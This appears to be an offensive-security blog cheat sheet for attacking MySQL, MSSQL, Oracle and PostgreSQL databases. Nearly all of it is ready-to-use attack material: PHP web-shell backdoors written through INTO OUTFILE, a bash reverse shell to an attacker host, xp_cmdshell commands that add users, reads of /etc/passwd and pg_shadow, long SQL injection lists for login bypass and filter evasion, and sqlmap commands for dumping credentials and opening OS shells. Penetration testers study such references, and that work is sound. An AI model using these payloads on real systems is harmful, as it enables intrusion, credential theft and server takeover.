---
title: "SQL"
date: 2021-06-08T18:17:00+07:00
draft: false
categories: [
    "Offensive Security"
]
tags: [
    "SQL",
]
---
# General
## MySQL-3306
#### Nmap
```bash
nmap -Pn -sV -p 3306 --script mysql* TARGETIP
```
#### Access Remotely:
```sql
mysql -host=TARGETIP -u root -p
mysql -u root -p password -e 'show databases;'
mysql -u root -p password DBNAME -e 'select * from TABLENAME;'
```
#### Access Locally:
```sql
mysql -u root -p
mysql> use DBNAME;
mysql> show tables;
```
#### Command Backdoor example:
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/backdoor.php";
SELECT "<?php exec(""/bin/bash -c 'bash -i >&/dev/tcp/ATTACKERIP/PORT 0>&1'""); ?> " into outfile "/tmp/shell.php";
```
#### Update a field example: (i.e. change a password):
```sql
update TABLENAME set PASSWORDFIELD = 'NEWHASH' where USERNAMEFIELD = 'USERNAME';
```
#### PHPMyAdmin
Default User: root\
Default Password: (none)\
Create a new table, then go to the SQL tab
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\command.php";`
http://TARGTEIP/phpmyadmin/command.php?cmd=ipconfig
```
## MSSQL-1433
Default username : sa
#### Nmap
```bash
nmap -sV -Pn -p 1433 --script ms-sql-brute --script-args
userdb=users.txt,passdb=passwords.txt TARGETIP
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args
mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net usertester Tester123! /add" TARGETIP
```
#### Sqsh.
[https://sourceforge.net/projects/sqsh/](https://sourceforge.net/projects/sqsh/)\
You can use sqsh to interact with MSSQL databases.\
Install the following:
```bash
apt-get install freetds
apt-get install sqsh
```
Edit /etc/freetds/freetds.conf
```bash
[SERVERNAME]
host = 10.11.12.13
port = 1433
tds version = 8.0
```
Edit .sqshrc\
`\set style=vert`\
Connect to the database:
```bash
sqsh -S SERVERNAME -U USER -P PASSWORD
>exec xp_cmdshell 'whoami'
>go
```
Metasploit:
```bash
use auxiliary/scanner/mssql/mssql_login
use exploit/windows/mssql/mssql_payload
```
#### Impacket.
Get SQL Shell\
`mssqlclient.exe quabbles/sqladmin@192.168.3.73 -windows-auth`\
Using proxy\
`proxychains python mssqlclient.py quabbles/sqladmin@192.168.x.x -windows-auth`\
Run mssql.txt file when authen success (mssql account)\
`proxychains python mssqlclient.py ./sa:admin@192.168.x.x -file mssql.txt`\
Run mssql.txt file when authen success (win authen)\
`proxychains python mssqlclient.py -p 1433 quabbles/sqladmin:123456@192.168.x.x -windows-auth -file cpmmand.txt`\
Can using PTH if can\
`mssqlclient.exe -p 1433 -hashes :"hash" quabbles/sqladmin@192.168.x.x -file command.txt -windows-auth`\
https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py
https://github.com/maaaaz/impacket-examples-windows
## Oracle-1521
#### Nmap:
```bash
nmap -sV -Pn -p 1521 --script=oracle-sid-brute TARGETIP
nmap -sV -Pn -p 1521 --script=oracle-enum-users --script-args sid=ORCL,userdb=users.txt TARGETIP
```
#### Connect to Oracle from command line:
```bash
C:\>sqlplus / as sysdba
[will prompt for password]
C:\>sqlplus
[will prompt for user and password]
```
#### Oracle Default Accounts:
[https://www.orafaq.com/wiki/List_of_default_database_users](https://www.orafaq.com/wiki/List_of_default_database_users)
[http://www.petefinnigan.com/default/default_password_list.htm](http://www.petefinnigan.com/default/default_password_list.htm)\
Examples: applsys|apps; ctxsys|ctxsys;dbsnmp|dbsnmp ...

## PostgresSQL-5432
Default User: postgres
Default Password: (none)
Local Login: 
```bash
psql -d DATABASE -U USER
```
Remote Login: 
```bash
psql -h TARGETIP -d DATABASE -U USER
```
```bash
select version();	
select current_database();
select current_user;
select session_user;
select current_setting('log_connections');
select current_setting('log_statement');
select current_setting('port');
select current_setting('password_encryption');
select current_setting('krb_server_keyfile');
select current_setting('virtual_host');
select current_setting('port');
select current_setting('config_file');
select current_setting('hba_file');
select current_setting('data_directory');
select * from pg_shadow;
select * from pg_group;
create table myfile (input TEXT);
copy myfile from '/etc/passwd'; 
select * from myfile;copy myfile to /tmp/test;
```
# SQL Injection
### Bad character detect
```bash
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/ 
+
||
%
AND 1
AND 0
AND true
AND false
1-false
1-true
1*56
-2
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 -- - 
-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename -- - 
-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@
1 AND (SELECT * FROM Users) = 1	
' AND MID(VERSION(),1,1) = '5';
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
,(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--
#
/*
-- -
;%00
`
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
```
### Authen bypass
```bash
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
==
=
'
' --
' #
' –
'--
'/*
'#
" --
" #
"/*
' and 1='1
' and a='a
 or 1=1
 or true
' or ''='
" or ""="
1′) and '1′='1–
' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
 and 1=1
 and 1=1–
' and 'one'='one
' and 'one'='one–
' group by password having 1=1--
' group by userid having 1=1--
' group by username having 1=1--
 like '%'
 or 0=0 --
 or 0=0 #
 or 0=0 –
' or         0=0 #
' or 0=0 --
' or 0=0 #
' or 0=0 –
" or 0=0 --
" or 0=0 #
" or 0=0 –
%' or '0'='0
 or 1=1
 or 1=1--
 or 1=1/*
 or 1=1#
 or 1=1–
' or 1=1--
' or '1'='1
' or '1'='1'--
' or '1'='1'/*
' or '1'='1'#
' or '1′='1
' or 1=1
' or 1=1 --
' or 1=1 –
' or 1=1--
' or 1=1;#
' or 1=1/*
' or 1=1#
' or 1=1–
') or '1'='1
') or '1'='1--
') or '1'='1'--
') or '1'='1'/*
') or '1'='1'#
') or ('1'='1
') or ('1'='1--
') or ('1'='1'--
') or ('1'='1'/*
') or ('1'='1'#
'or'1=1
'or'1=1′
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 –
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1–
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1′='1–
) or ('1′='1–
' or 1=1 LIMIT 1;#
'or 1=1 or ''='
"or 1=1 or ""="
' or 'a'='a
' or a=a--
' or a=a–
') or ('a'='a
" or "a"="a
") or ("a"="a
') or ('a'='a and hi") or ("a"="a
' or 'one'='one
' or 'one'='one–
' or uid like '%
' or uname like '%
' or userid like '%
' or user like '%
' or username like '%
' or 'x'='x
') or ('x'='x
" or "x"="x
' OR 'x'='x'#;
'=' 'or' and '=' 'or'
' UNION ALL SELECT 1, @@version;#
' UNION ALL SELECT system_user(),user();#
' UNION select table_schema,table_name FROM information_Schema.tables;#
admin' and substring(password/text(),1,1)='7
' and substring(password/text(),1,1)='7
' or 1=1 limit 1 -- -+
'="or'
```
### SQL injection bypass filter
```sql
### Comments
//,
-- ,
/**/, 
#,
--+,
--  -,
;--a 
### Prefix
+ – ~ !
' or –+2=- -!!!'2
 ### Operator:
^, =, !=, %, /, *, &, &&, |, ||, , >>, <=, <=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST, GREATEST, CAST, CONVERT, IS, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL
### Spaces
%20 %09 %0a %0b %0c %0d %a0 /**/
'or+(1)sounds/**/like"1"–%a0-
'union(select(1),tabe_name,(3)from`information_schema`.`tables`)#
### A quoted string
SELECT 'a'
SELECT "a"
SELECT n'a'
SELECT b'1100001′
SELECT _binary'1100001′
SELECT x'61'
### Unquoted string
'abc' = 0×616263
and substr(data,1,1) = 'a'#
and substr(data,1,1) = 0x61 # 0x6162
and substr(data,1,1) = unhex(61)    # unhex(6162)
and substr(data,1,1) = char(97  )# char(97,98)
and substr(data,1,1) = 'a'#
and hex(substr(data,1,1)) = 61#
and ascii(substr(data,1,1)) = 97#
and ord(substr(data,1,1)) = 97# 
and substr(data,1,1) = lower(conv(10,10,36))# 'a'
### Alias
select pass as alias from users
select pass`alias alias`from users
```
```sql
### Font
' or true = '1 # or 1
'' or round(pi(),1)+true+true = version() # or 3.1+1+1 = 5.1
' or '1 # or true
### Operator fonts
select * from users where 'a'='b'='c'
select * from users where ('a'='b')='c'
select * from users where (false)='c'
### Seriously bypass the '='
select * from users where name = "="
select * from users where false = ""
select * from users where 0 = 0
 select * from users where true # filter function ascii (97)
load_file/*foo*/(0×616263)
 Construction # string functions
'abc' = unhex(616263)
'abc' = char(97,98,99)
 hex('a') = 61
 ascii('a') = 97
 ord('a') = 97
'ABC' = concat(conv(10,10,36),conv(11,10,36),conv(12,10,36))
### Extracted substring substr ( 'abc', 1,1) = 'a'
substr('abc' from 1 for 1) = 'a'
substring('abc',1,1) = 'a'
substring('abc' from 1 for 1) = 'a'
mid('abc',1,1) = 'a'
mid('abc' from 1 for 1) = 'a'
lpad('abc',1,space(1)) = 'a'
rpad('abc',1,space(1)) = 'a'
left('abc',1) = 'a'
reverse(right(reverse('abc'),1)) = 'a'
insert(insert('abc',1,0,space(0)),2,222,space(0)) = 'a'
space(0) = trim(version()from(version()))
### Substring search
locate('a','abc')
position('a','abc')
position('a' IN 'abc')
instr('abc','a')
substring_index('ab','b',1)
Split string #
length(trim(leading 'a' FROM 'abc'))
length(replace('abc', 'a', "))
```
```sql
### String comparison
strcmp('a','a')
mod('a','a')
find_in_set('a','a')
field('a','a')
count(concat('a','a'))
 
### String length
length()
bit_length()
char_length()
octet_length()
bit_count()
 
### Keyword filter
Connected keyword filtering
(0)union(select(table_name),column_name,…
0/**/union/*!50000select*/table_name`foo`/**/…
0%a0union%a0select%09group_concat(table_name)….
0′union all select all`table_name`foo from`information_schema`. `tables`
 
### Flow control
case 'a' when 'a' then 1 [else 0] end
case when 'a'='a' then 1 [else 0] end
if('a'='a',1,0)
ifnull(nullif('a','a'),1)
 d) a test vector
%55nion(%53elect 1,2,3)-- -
 
+union+distinctROW+select+
/**//*!12345UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
+#uNiOn+#sEleCt
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/*!u%6eion*/ /*!se%6cect*/
+un/**/ion+se/**/lect
uni%0bon+se%0blect
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
REVERSE(noinu)+REVERSE(tceles)
/*--*/union/*--*/select/*--*/
union (/*!/**/ SeleCT */ 1,2,3)
/*!union*/+/*!select*/
union+/*!select*/
/**//*!union*//**//*!select*//**/
/*!uNIOn*/ /*!SelECt*/
+union+distinctROW+select+
-15+(uNioN)+(sElECt)
-15+(UnI)(oN)+(SeL)(ecT)+
 
id=1+UnIOn/**/SeLect 1,2,3—
id=1+UNIunionON+SELselectECT 1,2,3—
id=1+/*!UnIOn*/+/*!sElEcT*/ 1,2,3—
id=1 and (select 1)=(Select 0xAA 1000 more A’s)+UnIoN+SeLeCT 1,2,3—
id=1+un/**/ion+sel/**/ect+1,2,3--
id=1+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3
id=1+/**/union/*&id=*/select/*&id=*/column/*&id=*/from/*&id=*/table--
id=1+/**/union/*&id=*/select/*&id=*/1,2,3--
id=-1 and (select 1)=(Select 0xAA*1000) /*!UNION*/ /*!SELECT*//**/1,2,3,4,5,6—x
 
/**/union/*&id=*/select/*&id=*/column/*&id=*/from/*&id=*/table--
/*!union*/+/*!select*/+1,2,3—
/*!UnIOn*//*!SeLect*/+1,2,3—
un/**/ion+sel/**/ect+1,2,3—
/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3—
ID=66+UnIoN+aLL+SeLeCt+1,2,3,4,5,6,7,(SELECT+concat(0x3a,id,0x3a,password,0x3a)+FROM+information_schema.columns+WHERE+table_schema=0x6334706F645F666573746976616C5F636D73+AND+table_name=0x7573657273),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--
 
?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123
?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,
?id=15+/*!UnIoN*/+/*!aLl*/+/*!SeLeCt*/+1,version(),3,4,5,6,7--
id=1/*!limit+0+union+select+concat_ws(0×3a,table_name,column_name)+from+information_schema.columns*/
 
id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.TABLES-- 
id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--
 
SELECT*FROM(test)WHERE(name)IN(_ucs2 0x01df010e004d00cf0148);
SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) in xml way
 
select user from mysql.user where user = 'user' OR mid(password,1,1)=unhex('2a')
select user from mysql.user where user = 'user' OR mid(password,1,1) regexp '[*]'
select user from mysql.user where user = 'user' OR mid(password,1,1) like '*'
select user from mysql.user where user = 'user' OR mid(password,1,1) rlike '[*]'
select user from mysql.user where user = 'user' OR ord(mid(password,1,1))=42
 
/?id=1+union+(select'1',concat(login,hash)from+users)
/?id=(1)union(((((((select(1),hex(hash)from(users))))))))
 
?id=1'; /*&id=1*/ EXEC /*&id=1*/ master..xp_cmdshell /*&id=1*/ net user lucifer UrWaFisShiT /*&id=1*/ --
id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
id=10 and 1=0/(select top 1 table_name from information_schema.tables)
id=-725+UNION+SELECT+1,GROUP_CONCAT(id,0x3a,login,0x3a,password,0x3a,email,0x3a,access_level),3,4,5+FROM+Admin--
id = -725 + UNION + SELECT + 1, version (), 3,4,5 - sp_password // use request of log hidden sp_password
```
# SQLMAP
```bash
sqlmap -u "http://testsite.com/login.php" 
[eazy scan]
sqlmap -r request.txt 
[eazy scan with request file]
sqlmap -u "http://testsite.com/login.php" --tor --tor-type=SOCKS5 
[using tor]
sqlmap -u "http://testsite.com/login.php" --dbs 
[list all database]
sqlmap -u "http://testsite.com/login.php" -D site_db --tables
[list table in db site_db]
sqlmap -u "http://testsite.com/login.php" -D site_db -T users --columns
[list collums]
sqlmap -u "http://testsite.com/login.php" -D site_db -T users -C username,password --dump
[Dump only selected columns]
sqlmap -u "http://testsite.com/login.php" –method "POST" –data "username=admin&password=admin&submit=Submit" -D social_mccodes -T users –dump
[Dump a table from a database when you have admin credentials]
sqlmap --dbms=mysql -u "http://testsite.com/login.php" --os-shell
[Get OS Shel]
sqlmap --dbms=mysql -u "http://testsite.com/login.php" --sql-shell
[Get SQL Shell]
sqlmap -r login-chris.request --level 5 --risk 3 --batch --string "Wrong identification(query corect)"
[best]
```
# Reference

-[https://sqlwiki.netspi.com/#mysql](https://sqlwiki.netspi.com/#mysql)\
-[https://sites.google.com/a/michaelboman.org/www-michaelboman-org/books/sql-injection-cheat-sheet-oracle](https://sites.google.com/a/michaelboman.org/www-michaelboman-org/books/sql-injection-cheat-sheet-oracle)\
-[https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)\
-[https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/)